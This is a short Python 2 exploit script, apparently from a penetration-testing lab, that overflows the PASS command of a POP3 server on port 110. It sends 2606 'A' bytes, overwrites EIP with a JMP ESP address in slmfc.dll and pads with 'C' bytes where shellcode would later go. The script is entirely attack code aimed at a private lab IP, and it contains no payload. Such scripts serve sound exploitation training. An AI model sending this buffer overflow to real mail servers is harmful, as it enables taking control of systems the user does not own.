#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#send EIP to a JMP ESP instruction in slmfc.dll
buffer = 'A' * 2606  + '\x8f\x35\x4a\x5f' + 'C' * (3500 - 2606 - 4)


try:
    print "Sending evil buffer..."
    s.connect(('10.11.23.10', 110))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
